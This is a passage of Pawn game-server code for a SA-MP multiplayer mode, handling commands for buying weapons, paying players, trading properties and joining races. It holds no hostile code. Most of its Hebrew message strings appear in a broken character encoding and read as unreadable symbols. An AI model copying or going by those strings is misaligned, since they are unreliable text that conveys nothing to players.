		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх сюЎсъ фЁхычщ");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх сюёъ счщ°· фуюхщх·");
		GiveWeapon(playerid,46,0);
		PlaySound(playerid,1052);
		return 1;
	}
	if(equal(cmd,"/ccbuyweapon") || equal(cmd,"/ccbw"))
	{
		new weaponid, times, string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ сыущ ьсЎЄ Їўхуф цх");
		if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .рщя ьъ ы°шщё р∙°рщ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /ccbw [weapon number] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /wl :юёЇ°щ Ё∙ўщэ");
			SendClientMessage(playerid,white," (рх ф∙·ю∙ с·Ї°щш фюхЎт Єь фюёъ)");
			ShowPlayerConstDialog(playerid,dialog_ammu);
			return 1;
		}
		weaponid = strval(cmd), cmd = strtok(cmdtext,idx), times = 1;//!strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(weaponid < 1 || weaponid > sizeof(Ammunation)) return SendClientMessage(playerid,red," .юёЇ° Ё∙ў ∙тхщ");
		weaponid--;
		if(playerinfo[playerid][level] < Ammunation[weaponid][aLevel])
		{
			format(string,sizeof(string)," .сыущ ьўЁх· р· фЁ∙ў фцф Єьщъ ьфщх· ьЇчх· с°юф %d",Ammunation[weaponid][aLevel]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		if(times < 1) return SendClientMessage(playerid,red," .юёЇ° ЇЄющ ўЁщщф Ёюхъ юущ");
		if(times > 20) return SendClientMessage(playerid,red," .юёЇ° ЇЄющ ўЁщщф тухь юущ - юўёщюхэ 20 ЇЄющэ");
		if(playerinfo[playerid][bank] < (WeaponCost(playerid,weaponid)*times)) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє сыущ ьўЁх· р· фЁ∙ў фцф");
		if(Ammunation[weaponid][aSlot] < 8) playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]] += times;
		playerinfo[playerid][weapons][Ammunation[weaponid][aSlot]] = Ammunation[weaponid][aID];
		GiveWeapon(playerid,Ammunation[weaponid][aID],Ammunation[weaponid][aAmmo]*times);
		if(playerinfo[playerid][logged])
		{
			format(string,sizeof(string),"PlayerWeapon%d",Ammunation[weaponid][aSlot]);
			fsetint(fuser(playerid),string,Ammunation[weaponid][aID]);
			if(Ammunation[weaponid][aSlot] != 8 && Ammunation[weaponid][aSlot] != 9)
			{
				format(string,sizeof(string),"PlayerAmmo%d",Ammunation[weaponid][aSlot]);
				fsetint(fuser(playerid),string,playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]]);
			}
		}
		if(weaponid == 19) fsetint(fuser(playerid),"PlayerAmmo6",0), playerinfo[playerid][ammo][6] = 0;
		if(times != 1) format(string,sizeof(string)," .сЄц°· ы°шщё р∙°рщ %s °ы∙· %d ЇЄющэ р· фЁ∙ў",Ammunation[weaponid][aName],times);
		else format(string,sizeof(string)," .сЄц°· ы°шщё р∙°рщ %s °ы∙· р· фЁ∙ў",Ammunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		if(times > 1) format(string,sizeof(string)," (юёЇ° ЇЄющэ: %d) %s ўЁщ· сЄц°· ы°шщё р∙°рщ р· фЁ∙ў",times,Ammunation[weaponid][aName]);
		else format(string,sizeof(string)," %s ўЁщ· сЄц°· ы°шщё р∙°рщ р· фЁ∙ў",Ammunation[weaponid][aName]);
		UpdateBank(GetName(playerid),string,0-(WeaponCost(playerid,weaponid)*times));
		return 1;
	}
 	if(equal(cmd,"/givecash") || equal(cmd,"/pay"))
 	{
 		new id, amount, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pay [id/name] [amount/all] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pay [id/name] [amount/all] :Ўх°· ф∙щюх∙");
 		amount = IsNumeric(cmd) ? strval(cmd) : (equal(cmd,"all") ? GetMoney(playerid) : 0);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(id == playerid) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .ыюх· фЄс°ф ∙тхщф");
		if(amount > 10000000) return SendClientMessage(playerid,red," .Ёщ·я ьфЄсщ° Єу 10000000$ сыь фЄс°ф");
		if(playerinfo[id][inbattle]) return SendClientMessage(playerid,red," .∙чўя цф сў°с, ьр ·хыь ь∙ьхч ьх ыёє");
		if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .рщя рЇ∙°х· ь∙ьхч ыёє срюЎЄ ў°с");
		if(playerinfo[id][dmzone] != dmz_none || playerinfo[id][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙ьхч ыёє ь∙чўя срцх° фущрэ");
		if(playerinfo[playerid][paytimer][2] > -1) return SendClientMessage(playerid,red," .р·ф ыс° срюЎЄ ∙ьщч· ыёє, рЁр фю·я ∙фщр ·ё·щщэ");
		SetTimerPck(playerinfo[playerid][paytimer][0],"PayTimer",PAY_TIME * 1000,0,"iiii",playerid,playerinfo[playerid][paytimer][1] = id,amount,playerinfo[playerid][paytimer][2] = 0);
		format(string,sizeof(string)," .(/stop рх /spay :фыёє щ∙ьч сЄху %d ∙Ёщх·, ьсщшхь ф∙ьщчф) %s ∙ьч· %d$ ь",PAY_TIME,GetName(id),amount);
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," .(фыёє щ∙ьч ·хъ %d ∙Ёщх·) %s ўщсь· %d$ ю",PAY_TIME,GetName(playerid),amount);
		SendClientMessage(id,yellow,string);
		return 1;
	}
 	if(equal(cmd,"/stop") || equal(cmd,"/spay"))
 	{
		if(playerinfo[playerid][paytimer][2] != 0) return SendClientMessage(playerid,red," .р·ф ьр срюЎЄ ∙ьщч· ыёє хьыя ьр Ёщ·я ьф∙·ю∙ сЇўхуф фцх");
		new string[M_S];
		KillTimer(playerinfo[playerid][paytimer][0]);
		format(string,sizeof(string)," .%s сщшь· р· ∙ьщч· фыёє рь",GetName(playerinfo[playerid][paytimer][1]));
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," .сщшь р· ∙ьщч· фыёє рьщъ ьЇЁщ ∙фыёє Ё∙ьч %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][paytimer][1],yellow,string);
		playerinfo[playerid][paytimer][1] = INVALID_PLAYER_ID, playerinfo[playerid][paytimer][2] = -1;
		return 1;
	}
	if(equal(cmd,"/resetm"))
	{
		if(playerinfo[playerid][frozen][0]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цр· ∙р·ф сЇ°щц");
		SendClientMessage(playerid,lightblue," ~~~ :·ўЁх· ючщў· ыёє ~~~");
		SendClientMessage(playerid,yellow," .Єь юЁ· ьюЁхЄ рщ ЁЄщюхщх·, фЄуЇЁх ∙·сч° рэ р·ф сшхч ∙р·ф °хЎф ьсЎЄ р· фЇЄхьф фцх");
		SendClientMessage(playerid,yellow," /ResetM = Reset Money = фЇўхуф фцх, юхчў· р· ыёЇъ = рщЇхё ыёє");
		SendClientMessage(playerid,yellow," .Ўхх· фЁфь· ф∙°· рщЁх рч°рщ Єь ыёЇщэ ∙Ёючўх");
		SendClientMessage(playerid,yellow," .фрч°рщх· Єь фыёє ∙ьыэ фщр Єьщыэ - ыёє ∙Ёючў ьр щхчц°");
		SendClientMessage(playerid,grey," Х сющуф хр·ф юЄхЁщщя ьючхў р· ыёЇъ Yes сч° с");
		SendClientMessage(playerid,grey," Х Єь юЁ· ьсшь р· фчьш·ъ хьр ьючхў р· фыёє Enter рх ьчї No сч° с");
		ShowMenuForPlayer(areYouSure[0],playerid);
		return 1;
	}
 	if(equal(cmd,"/shekel"))
 	{
 		new id, string[M_S], d[3], give[64];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /shekel [id/name] :Ўх°· ф∙щюх∙");
		if((chatlocked || playerinfo[playerid][mute][0] > 0) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ьр ·хыь ьф∙·ю∙ сЇўхуф фцх сюЎсъ фЁхычщ");
		if(!playerinfo[playerid][cans]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(id == playerid) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
		getdate(d[0],d[1],d[2]);
		#if hanukkah_now
		give = "ёхЇтЁщщф";
		#else
		if(d[1] == 9 && d[2] >= 28 && d[2] <= 30) give = "·Їхч сус∙";
		else if(d[1] == 12 && d[2] >= 12 && d[2] <= 12) give = "ёхЇтЁщщф";
		else if((d[1] == 2 && d[2] >= 20 && d[2] <= 28)) give = "рхця фюя";
		else if((d[1] == 4 && d[2] >= 1 && d[2] <= 14) || (d[1] == 3 && d[2] >= 27)) give = "юЎф";
		else give = "∙ўь";
		#endif
		if(GetMoney(playerid) < 1)
		{
			format(string,sizeof(string)," !ЄЁщ, рЇщьх %s рщя ьъ",give);
			return SendClientMessage(playerid,red,string);
		}
		GiveMoney(playerid,0-1,-1);
		GiveMoney(id,1,-1);
		if(d[2] >= 23 && d[2] <= 29 && d[1] == 5) format(string,sizeof(string)," .%s ц°ў сьхя ющэ Єь %s",GetName(id),GetName(playerid));
		else format(string,sizeof(string)," .%s ∙ьч %s ь %s",GetName(id),give,GetName(playerid));
		SendClientMessageToAll(lightblue,string);
		playerinfo[playerid][cans] = 0;
		SetTimerEx("CanS",30000,0,"d",playerid);
		return 1;
	}
	if(equal(cmd,"/exports"))
	{
		new string[M_S];
		if(wangv == -1) return SendClientMessage(playerid,red," .юхёъ ххрЁт ьр ючЇ∙ ы°тЄ ∙хэ °ыс");
		format(string,sizeof(string)," .%s юхёъ ххрЁт ючЇ∙",GetVehicleName(GetVehicleModel(wangv)));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/per"))
	{
		new string[M_S];
		format(string,sizeof(string)," $ (/per) %cрчхц фЁыёщэ фхр ыЄ· %d $",'%',propertyPercent);
		SendClientMessage(playerid,lightgreen,string);
		return 1;
	}
	if(equal(cmd,"/property"))
	{
		new string[M_S], p, f[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			format(string,sizeof(string)," /property [1-%d] :Ўх°· ф∙щюх∙",props);
			SendClientMessage(playerid,white,string);
			return 1;
		}
		p = strval(cmd) - 1;
		if(p < 0 || p > props-1) return SendClientMessage(playerid,red," .юёЇ° Ёыё ∙тхщ");
		format(string,sizeof(string)," ~~~ :\"%s\" фЁыё ~~~",propinfo[p][pname]);
		SendClientMessage(playerid,lightblue,string);
		format(string,sizeof(string)," %d :юёЇ°",p + 1);
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," (ючщ°: $%d (ьЇщ рчхц фЁыёщэ: $%d",propinfo[p][pcost],propper(propinfo[p][pcost]));
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," (ю∙ых°·: $%d (ьЇщ рчхц фЁыёщэ: $%d",propinfo[p][pearning],propper(propinfo[p][pearning]));
		SendClientMessage(playerid,yellow,string);
		format(f,sizeof(f),"/DM/Properties/%d.ini",p);
		format(string,sizeof(string)," (ю∙ых°х· ∙Ёх·°х: %d) %s :сЄьщэ Ёхычщщэ",fgetint(f,"LeftEarns"),fgetstring(f,"Owner"));
		SendClientMessage(playerid,yellow,string);
		if(propinfo[p][spid] > 0)
		{
			SendClientMessage(playerid,grey," :Ёыё цф фхр Ёыё ющхчу");
			SendClientMessage(playerid,grey,propinfo[p][sptext]);
		}
		return 1;
	}
	if(equal(cmd,"/buy"))
	{
		new Float:h;
		GetPlayerHealth(playerid,h);
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT || h == 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх сюЎсъ фЁхычщ");
		if(playerinfo[playerid][propscount] >= max_player_props) return SendClientMessage(playerid,red," .Єс°· р· фтсь· фЁыёщэ фюх·°· ьыь ∙чўя, ффтсьф фщЁф " #max_player_props);// WORKS WTF?!
		//if(GetTickCount()-playerinfo[playerid][proptime] <= 60000) return SendClientMessage(playerid,red," .щ∙ ьфю·щя 5 уўх· сщя ўЁщщ· ыь Ёыё");
		new f[M_S], string[M_S], p = playerinfo[playerid][propertyid];
		if(p == -1 || GetPlayerVirtualWorld(playerid) != world_normal || !IsPlayerInRangeOfPoint(playerid, 5, propinfo[p][px], propinfo[p][py], propinfo[p][pz])) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сЁыё сыущ ьсЎЄ Їўхуф цх");
		format(f,sizeof(f),"/DM/Properties/%d.ini",p);
		if(propinfo[p][owner] == playerid) return SendClientMessage(playerid,red," .фЁыё фцф ыс° ∙щщъ ьъ");
		if(propinfo[p][owner] != INVALID_PLAYER_ID && IsPlayerConnected(propinfo[p][owner])) if(playerinfo[propinfo[p][owner]][earns][p] >= 15) return SendClientMessage(playerid,red," .ьр Ёщ·я ьўЁх· Ёыё ∙ссЄьх·х ∙ь ющ∙фх рч°, рЁр фю·я ∙щ∙р°х ьх 15 ю∙ых°х· рх Їчх·");
		if(GetMoney(playerid) < propper(propinfo[p][pcost])) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє сыущ ьўЁх· р· фЁыё фцф");
		if(IsPlayerConnected(propinfo[p][owner]))
		{
			format(string,sizeof(string)," .%s ЁўЁф Єь щущщ %s-фЁыё ∙ьъ, ф",GetName(playerid),propinfo[p][pname]);
			SendClientMessage(propinfo[p][owner],red,string);
			if(playerinfo[propinfo[p][owner]][earns][p] > prop_earns/2)
			{
				GiveMoney(propinfo[p][owner],playerinfo[propinfo[p][owner]][propcost][p] / 2,22);
				SendClientMessage(propinfo[p][owner],grey," (юыщххя ∙ьр ф°ххч· щх·° юущ юфЁыё фцф, ўщсь· ючЎщ· юфёыхэ сх ўЁщ· рх·х)");
			}
			playerinfo[propinfo[p][owner]][propscount]--;
			playerinfo[propinfo[p][owner]][earns][p] = 0;
			playerinfo[propinfo[p][owner]][propcost][p] = 0;
		}
		if((!p || p == 2) && !GetPlayerInterior(playerid))
		{
			AdminInfo(playerid, "ЁщЎхь срт Ёыёщэ, щ∙ ьшЇь");
			JailPlayer(playerid, 120);
			format(string,sizeof(string)," *** %s has been jailed for 120 seconds by %s. (ЁщЎхь срт Ёыёщэ)", GetName(playerid), botname);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
			return 1;
		}
		propinfo[p][owner] = playerid, playerinfo[playerid][earns][p] = prop_earns, playerinfo[playerid][propcost][p] = propper(propinfo[p][pcost]), playerinfo[playerid][propscount]++;
		playerinfo[playerid][proptime] = GetTickCount();
		if(playerinfo[playerid][propscount] == max_player_props) ObjectiveComplete(playerid,objective_properties);
		GiveMoney(playerid,0-propper(propinfo[p][pcost]),22);
		fsetstring(f,"Owner",GetName(playerid));
		fsetint(f,"LeftEarns",prop_earns);
		fsetint(f,"BoughtCost",propper(propinfo[p][pcost]));
		format(string,sizeof(string)," Х !" @c(lightgreen) "%s" @c(green) " °ы∙ р· фЁыё %s",propinfo[p][pname],GetName(playerid));
		SendClientMessageToAll(green,string);
		format(string,sizeof(string),@c(green) "!$%d-с %s °ы∙· сфЎьчф р· фЁыё\n.р·ф фхьъ ьўсь Єьщх ю∙ых°· ∙ь $%d сыь ∙·щ уўх· ью∙ъ %d ЇЄющэ",propper(propinfo[p][pcost]),propinfo[p][pname],propper(propinfo[p][pearning]),prop_earns);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ёыё",string,"OK","");
		UpdatePropertyText(p);
		PlaySound(playerid,1149);
		return 1;
	}
	if(equal(cmd,"/sell"))
	{
		if(GetTickCount()-playerinfo[playerid][proptime] <= 60000) return SendClientMessage(playerid,red," .щ∙ ьфю·щя уўф сыущ ьюых° Ёыё ьрч° ыь ўЁщщф ∙ь Ёыё");
		new f[M_S], string[M_S], p = playerinfo[playerid][propertyid];
		if(p == -1) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сЁыё сыущ ьсЎЄ Їўхуф цх");
		format(f,sizeof(f),"/DM/Properties/%d.ini",p);
		if(propinfo[p][owner] != playerid) return SendClientMessage(playerid,red," .рщЁъ сЄь фЁыё фцф");
		if(playerinfo[playerid][earns][p] > prop_earns/2)
		{
			GiveMoney(playerid,playerinfo[playerid][propcost][p]/2,24);
			format(string,sizeof(string)," .хф°ххч· Єьщх ючЎщ· юфючщ° ∙∙щью· - $%d %s юы°· р· фЁыё",playerinfo[playerid][propcost][p]/2,propinfo[p][pname]);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string),@c(green) "!$%d хўщсь· Єьщх %s юы°· сфЎьчф р· фЁыё",playerinfo[playerid][propcost][p]/2,propinfo[p][pname]);
		}
		else
		{
			format(string,sizeof(string)," .%s юы°· р· фЁыё",propinfo[p][pname]);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string),@c(green) "!%s юы°· сфЎьчф р· фЁыё",propinfo[p][pname]);
		}
		if(!playerinfo[playerid][noticedmsg][14])
		{
			SendClientMessage(playerid,grey," (ы∙р·ф юхы° Ёыёщэ, рэ ф°ххч· Єьщфэ щх·° юущ ю∙ых°х· ьр ·ўсь ыёє юфюыщ°ф, рч°· ·ўсь чЎщ юфючщ° фюўх°щ ∙∙щью· Єь фЁыё)");
			playerinfo[playerid][noticedmsg][14] = 1;
		}
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ёыё",string,"OK","");
		propinfo[p][owner] = INVALID_PLAYER_ID, playerinfo[playerid][earns][p] = 0, playerinfo[playerid][propcost][p] = 0, playerinfo[playerid][propscount]--;
		fsetstring(f,"Owner","None");
		fsetint(f,"LeftEarns",prop_earns);
		fsetint(f,"BoughtCost",0);
		UpdatePropertyText(p);
		return 1;
	}
	if(equal(cmd,"/sellall"))
	{
		if(GetTickCount()-playerinfo[playerid][proptime] <= 60000) return SendClientMessage(playerid,red," .щ∙ ьфю·щя уўф сыущ ьюых° Ёыё ьрч° ыь ўЁщщф ∙ь Ёыё");
		new f[M_S], string[M_S], owns = 0, pay = 0;
		for(new i = 0; i < props; i++) if(propinfo[i][owner] == playerid) owns++;
		if(!owns) return SendClientMessage(playerid,red," .рщя ∙хэ Ёыё ссЄьх·ъ");
		for(new p = 0; p < props; p++) if(propinfo[p][owner] == playerid)
		{
			if(playerinfo[playerid][earns][p] > prop_earns/2) pay += playerinfo[playerid][propcost][p]/2;
			propinfo[p][owner] = INVALID_PLAYER_ID, playerinfo[playerid][earns][p] = 0;
			format(f,sizeof(f),"/DM/Properties/%d.ini",p);
			fsetstring(f,"Owner","None");
			fsetint(f,"LeftEarns",prop_earns);
			fsetint(f,"BoughtCost",0);
			UpdatePropertyText(p);
		}
		if(!pay) SendClientMessage(playerid,green," .юы°· р· ыь фЁыёщэ ∙ьъ");
		else
		{
			GiveMoney(playerid,pay,24);
			format(string,sizeof(string)," .юы°· р· ыь фЁыёщэ ∙ьъ хф°ххч· Єьщфэ $%d",pay);
			SendClientMessage(playerid,green,string);
		}
		playerinfo[playerid][propscount] = 0;
		return 1;
	}
	if(equal(cmd,"/properties") || equal(cmd,"/props"))
	{
		cmd = strtok(cmdtext,idx);
		new string[M_S], menus = 0, s = -1, menuchoosen = 0, propowner[MAX_PLAYER_NAME];
		for(new i = 0; i < max_properties; i++) if(propinfo[i][pcost] > 0) s++;
		menus = s / 7;
		if(s % 7 > 0) menus++;
		if(!strlen(cmd))
		{
			format(string,sizeof(string),equal(cmd,"/properties") ? (" /properties [1-%d] :Ўх°· ф∙щюх∙") : (" /props [1-%d] :Ўх°· ф∙щюх∙"),menus);
			return SendClientMessage(playerid,white,string);
		}
		if(strval(cmd) < 1 || strval(cmd) > menus) return SendClientMessage(playerid,red," .·Ї°щш Ёыёщэ ∙тхщ");
		format(string,sizeof(string)," ~~~ :°∙щю· фЁыёщэ - %d ~~~",strval(cmd));
		SendClientMessage(playerid,lightblue,string);
		SendClientMessage(playerid,brown," (PropertyID. Name (Cost, Earnings) - Owner)");
		menuchoosen = strval(cmd) * 7 - 6;
		for(new i = menuchoosen - 1; i < menuchoosen + 7; i++)
		{
			format(string,sizeof(string),"/DM/Properties/%d.ini",i);
			if(i > s || !fexist(string)) break;
			format(propowner,sizeof(propowner),fgetstring(string,"Owner"));
			if(equal(propowner,"None")) propowner = "ьр Ё°ы∙";
			if(i == menuchoosen - 1 && menuchoosen != 1) format(string,sizeof(string)," Х ... %02d. %s (%d$, %d$) - %s",i + 1,propinfo[i][pname],propper(propinfo[i][pcost]),propper(propinfo[i][pearning]),propowner);
			else if(i == menuchoosen + 6 && menuchoosen != menus) format(string,sizeof(string)," Х %02d. %s (%d$, %d$) - %s ...",i + 1,propinfo[i][pname],propper(propinfo[i][pcost]),propper(propinfo[i][pearning]),propowner);
			else format(string,sizeof(string)," Х %02d. %s (%d$, %d$) - %s",i + 1,propinfo[i][pname],propper(propinfo[i][pcost]),propper(propinfo[i][pearning]),propowner);
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/myproperties") || equal(cmd,"/myprops"))
	{
		new c, str[500], maxstr[M_S_D];
		for(new x; x < max_properties; x++) if(propinfo[x][pcost] && propinfo[x][owner] == playerid)
		{
			c++;
			format(str, sizeof(str), "{FFFF00}Х (%d) {FFFFFF}%s{FFFF00} [рщщущ: {FFFFFF}%d{FFFF00} | ю∙ых°х· ∙Ё∙р°х: {FFFFFF}%d{FFFF00} | ю∙ых°·: {FFFFFF}%d${FFFF00}]\n", c, propinfo[x][pname], x + 1, playerinfo[playerid][earns][x], propper(propinfo[x][pearning]));
			strcat(maxstr, str);
		}
		if(!c) return SendClientMessage(playerid, red, " .рщя ьъ Ёыёщэ");
		format(str, sizeof(str), "\n{FFFF00} .с°∙х·ъ {FFFFFF}%d {FFFF00}Ёыёщэ", c);
		strcat(maxstr, str);
		return ShowPlayerDialog(playerid, 999, DIALOG_STYLE_MSGBOX, "{FFFF00}:фЁыёщэ ∙ьщ", maxstr, "рщ∙х°", "");
	}
	if(equal(cmd,"/racing"))
	{
		new string[M_S], rtype[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /racing [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /racing state :фЎт· юЎс фющ°хї фЁхычщ");
			SendClientMessage(playerid,white," /racing join :фЎш°Їх· ьющ°хї");
			SendClientMessage(playerid,white," /racing quit :Ї°щ∙ф юющ°хї");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /racing start [race type] [style] :ф·чь· ющ°хї чу∙");
				SendClientMessage(playerid,white," /racing end [reason] :ёщхэ фющ°хї фЁхычщ");
			}
			SendClientMessage(playerid,white," /racing types :фЎт· ёхтщ фющ°хЎщэ хюёЇ°э");
			return SendClientMessage(playerid,white," /racing records :шсь· ∙щрщ ющ°хЎщэ");
		}
		switch(raceinfo[4])
		{
			case race1_cars: rtype = "юыхЁщх·";
			case race2_bikes: rtype = "рхЇЁхЄщэ";
			case race3_planes: rtype = "юшхёщэ";
			case race4_boats: rtype = "ёщ°х·";
			case race5_crazy: rtype = "ю∙хтЄ";
			case race6_tires: rtype = "ЇрЁЎ'°щэ";
			case race7_invcars: rtype = "юыхЁщх· сь·щ Ё°рх·";
			case race8_waterdrive: rtype = "юыхЁщх· ЁхёЄх· Єь фющэ";
		}
		if(equal(cmd,"state"))
		{
			if(raceinfo[0])
			{
				if(raceinfo[2] > 1) format(string,sizeof(string)," .щ∙ ющ°хї %s хфщЎщрф ьу°ъ ··чщь сЄху %d ∙Ёщх·",rtype,raceinfo[2]);
				else format(string,sizeof(string)," .щ∙ ющ°хї %s хфхр ыс° ф·чщь",rtype);
				SendClientMessage(playerid,green,string);
			}
			else SendClientMessage(playerid,red," .рщя ыЄ· ющ°хї");
		}
		else if(equal(cmd,"join"))
		{
			if(!raceinfo[0]) return SendClientMessage(playerid,red," .рщя ющ°хї ы°тЄ");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitrace]) return SendClientMessage(playerid,red," .фющ°хї щ·чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inrace]) return SendClientMessage(playerid,red," .р·ф ыс° сющ°хї");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if((raceinfo[4] == race7_invcars || raceinfo[4] == race8_waterdrive) && !IsPlayerUsingSGuard_(playerid)) return SendClientMessage(playerid,red," .ыущ ьфЎш°є ьЇЄщьх· цх SAMP-IL Guard Єьщъ ьф∙·ю∙ сюЄ°ы·");
			new spawns = GetRaceSpawnsCount();
			if(raceinfo[1] >= spawns) return SendClientMessage(playerid,red," .ыь фюўхюх· сющ°хї ·Їхёщэ");
			if(raceinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
			if(GetVehicleType(GetPlayerVehicleID(playerid)) == 5 || !IsRaceVehicle(raceinfo[4],GetPlayerVehicleID(playerid)) && raceinfo[4] != race5_crazy) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфыЁё ьёхт фющ°хї фЁхычщ Єэ ф°ыс фцф");
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)) && i != playerid) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьсу с°ыс");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitrace] = 1;
			playerinfo[playerid][raceid] = raceinfo[1];
			raceinfo[1]++;
			if(raceinfo[4] == race5_crazy) SendClientMessageToAll(green,CrazyRaceJoin(playerid));
			else
			{
				format(string,sizeof(string)," + !фЎш°є ьющ°хї ф%s %s",rtype,GetName(playerid));
				SendClientMessageToAll(green,string);
			}
			SendClientMessage(playerid,lightblue," Х Х :фЎш°Ї· ьющ°хї Х Х");
			SendClientMessage(playerid,green," - юш°·ъ фщр ьфтщЄ ыюф ∙щх·° юф° ьўх фёщхэ");
			SendClientMessage(playerid,green," - Єўхс рч°щ фЁўхух· фрухюх· ∙·°рф сюёьхь, Єу ∙·тщЄ ьёхЇя");
			format(string,sizeof(string)," Х ∙э фющ°хї: ющ°хї %s",rtype);
			SendClientMessage(playerid,yellow,raceinfo[4] == race5_crazy ? (" Х Crazy Race :∙э фющ°хї") : (string));
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",raceinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!raceinfo[0]) return SendClientMessage(playerid,red," .рщя ющ°хї ы°тЄ");
			if(!playerinfo[playerid][inrace]) return SendClientMessage(playerid,red," .р·ф ьр сющ°хї");
			SendClientMessage(playerid,green," .Ї°∙· юфющ°хї");
			OutOfActivity(playerid);
			format(string,sizeof(string),raceinfo[4] == race5_crazy ? (" - !Crazy Race-Ї°∙ ю %s") : (" - !Ї°∙ юфющ°хї %s"),GetName(playerid));
			SendClientMessageToAll(red,string);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
